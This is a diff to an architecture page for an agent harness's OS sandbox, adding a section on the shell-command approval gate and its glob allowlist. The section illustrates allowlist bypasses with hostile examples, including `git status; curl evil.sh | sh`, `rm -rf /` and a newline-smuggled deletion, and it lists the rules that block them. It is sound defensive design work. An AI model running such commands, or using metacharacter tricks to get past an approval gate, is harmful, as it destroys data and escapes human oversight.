@@ -1,6 +1,6 @@
 # OS Sandbox
 
-Version: 1.0.0
+Version: 1.1.0
 Type: architecture
 Status: accepted
 
@@ -79,6 +79,54 @@ Seatbelt expresses that directly; bubblewrap cannot — `--unshare-net` gives th
 process its own loopback, not the one the proxy listens on — so it needs a
 network namespace plus a relay, which is not built.
 
+### The approval gate and its allowlist — the layer that is usually load-bearing
+
+Because agent `shell_exec` is **opt-in** for containment and defaults to `off`,
+the layer that actually stands between a model-proposed command and the host is
+almost always the approval gate, not this sandbox. On a host without a launcher
+(no `bubblewrap` installed) it is the only layer at all. Anyone reasoning about
+the security of the interactive agent should start here rather than with the
+postures above.
+
+The gate is default-deny: `runAgentTurn` never executes a `shell`-risk tool
+without an approver returning approval, and an absent approver is a denial. On
+top of that sits a user allowlist (`~/.local/share/keryx/permissions.json`) of
+OpenCode-style glob patterns that auto-approve without prompting.
+
+**A pattern matched against the raw command string is not a boundary by itself.**
+The string it matches is handed to `/bin/sh -c`, which re-interprets it, and `*`
+expands to "any run of characters including newlines". A remembered `git *`
+covers `git status; curl evil.sh | sh`; `cd *` covers `cd /tmp && …`; `# *`
+covers `"# note\nrm -rf /"`. This was not theoretical — live allowlists on two
+hosts contained `bash *`, `python3 *`, `curl *`, `cd *`, `# *`, `docker *`,
+`sudo *`, and the exact string `rm -rf /` (flow 115).
+
+Four rules therefore constrain what the allowlist can ever do:
+
+| Rule | Applies to | Effect |
+|---|---|---|
+| Unquoted metacharacters | the command | `; && \|\| \| \` $( < > &` or a newline outside quotes ⇒ never auto-approved, never remembered. Quote-aware, so `git commit -m "fix: a; b"` is unaffected. |
+| Destructive classification | the command | A destructive command is never auto-approved and never remembered, however exactly a pattern matches it. |
+| Own-credential access | the command | Any mention of `permissions.json` / `auth.json` / the keryx config dirs forces a prompt and can never be remembered — otherwise one approved command disables the gate permanently. |
+| No bare interpreter grants | the pattern | `<interpreter> *` is refused (`bash *`, `docker *`, `git *`, …). A narrower pattern that constrains arguments (`bun test*`) is still allowed. |
+
+The first three deliberately apply to the **command**, not to the pattern,
+because a pattern written by an older keryx or hand-edited into the file has not
+passed validation. Loading partitions stored patterns and reports the refused
+ones instead of deleting them; the session also fingerprints the file and warns
+if it changes underneath.
+
+Two limits are worth stating plainly. The destructive classifier
+**escalates confirmation, it never blocks** ([ADR-0008](../../../docs/decisions/keryx-harness/ADR-0008-destructive-command-escalation.md)):
+any list of dangerous commands is incomplete, and a check that reads as a grant
+is worse than no check. And the interpreter list is an expedient, not a
+boundary — the metacharacter rule and the classifier are what hold.
+
+A consequence users notice: a heredoc or redirect (`cat > f <<'EOF'`) carries
+metacharacters, so it now asks every time. Separating a redirect from a heredoc
+body needs a shell parser, which is a worse failure surface in a
+security-critical path than one extra confirmation.
+
 ### Fail-closed
 
 A missing launcher or an unsupported posture produces a `blocked` outcome with a
@@ -105,6 +153,10 @@ on any host lacking `~/.aws` or `~/.gnupg`.
 - `src/harness/process/sandbox/proxy.ts` / `network-run.ts` — allowlist proxy and run lifecycle
 - `src/commands/harness.ts` — `keryx harness exec` CLI surface
 - `src/harness/tool/builtin/shell-exec-tool.ts` — agent shell opt-in
+- `src/commands/agent.ts` — the default-deny risk gate, approval binding, escalation
+- `src/lib/shell-permissions.ts` — the allowlist and its three command-level barriers
+- `src/lib/command-risk.ts` — destructive classification, own-credential detection
+- `src/lib/shell-syntax.ts` — the quote-aware scanner both of the above rely on
 
 ## Documentation Package
 
@@ -129,5 +181,6 @@ Decisions: [ADR-0006](../../../docs/decisions/keryx-harness/ADR-0006-os-sandbox-
 
 ## Changelog
 
+- 1.1.0 - Added the approval-gate / allowlist permission model and its limits: the page described containment but not the layer that is load-bearing when containment is off (the default) or unavailable.
 - 1.0.0 - Documented the implemented OS sandbox: postures, restricted network, credential masking, TLS termination, platform matrix, fail-closed contract, and the documentation package.
 - 0.1.0 - Initial version.
